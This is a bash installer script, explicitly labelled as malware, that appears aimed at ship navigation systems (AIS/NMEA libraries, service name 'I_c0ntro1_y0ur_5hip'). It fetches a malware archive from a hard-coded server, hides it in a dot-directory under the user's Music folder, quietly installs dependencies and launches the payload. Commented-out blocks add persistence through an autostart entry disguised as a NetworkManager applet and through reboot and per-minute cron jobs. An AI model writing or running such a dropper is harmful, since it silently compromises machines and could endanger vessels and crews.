#!/bin/bash
set -e

### CONFIGURATION ###
SERVICE_NAME="I_c0ntro1_y0ur_5hip"
INSTALL_DIR="/$HOME/Music/.$SERVICE_NAME"
MALWARE_SRC_DIR="malware"
MALWARE_DIR="$INSTALL_DIR/$MALWARE_SRC_DIR"
VENV_DIR="$INSTALL_DIR/venv"
MAIN_PY="$MALWARE_DIR/__main__.py"

# The user under which we persist (for autostart & cron)
TARGET_USER="ubuntu"

# File-server hosting malware.tar.gz at http://FILESERVER:8000/malware.tar.gz
FILESERVER="192.168.166.166"
ARCHIVE_URL="http://$FILESERVER:8000/${MALWARE_SRC_DIR}.tar.gz"

### 1) Fetch code ###
mkdir -p "$MALWARE_DIR"
curl -fsSL "$ARCHIVE_URL" \
  | tar xz -C "$MALWARE_DIR" --strip-components=1

### 2) Create venv ###
python3 -m venv "$VENV_DIR"

### 3) Install deps silently ###
"$VENV_DIR/bin/pip" install --quiet --no-cache-dir \
  aiohttp~=3.8 pynmea2~=1.18 pyais~=2.4 setproctitle

# ### 4) Persistence #1: .desktop autostart ###
# AUTOSTART_DIR="/home/$TARGET_USER/.config/autostart"
# mkdir -p "$AUTOSTART_DIR"
# cat > "$AUTOSTART_DIR/$SERVICE_NAME.desktop" <<EOF
# [Desktop Entry]
# Type=Application
# Exec=$VENV_DIR/bin/python $MAIN_PY
# Hidden=false
# NoDisplay=false
# X-GNOME-Autostart-enabled=true
# Name=NetworkManager Applet
# Comment=Provides network management
# EOF
# chown -R $TARGET_USER:$TARGET_USER "$AUTOSTART_DIR"

# ### 5) Userâ€level cron: @reboot + per-minute check ###
# CRON_MARK="# $SERVICE_NAME"
# CRON_REBOOT="@reboot $VENV_DIR/bin/python $MAIN_PY $CRON_MARK"
# CRON_CHECK="* * * * * pgrep -f $SERVICE_NAME >/dev/null || $VENV_DIR/bin/python $MAIN_PY > /dev/null 2>&1 $CRON_MARK"
# ( crontab -u "$TARGET_USER" -l 2>/dev/null \
#     | grep -v -F "$CRON_MARK" \
#   ; echo "$CRON_REBOOT" \
#     echo "$CRON_CHECK" \
# ) | crontab -u "$TARGET_USER" -

### 6) Launch NOW, replacing this script with the Python process ###
cd "$MALWARE_DIR"
exec "$VENV_DIR/bin/python" "$MAIN_PY"
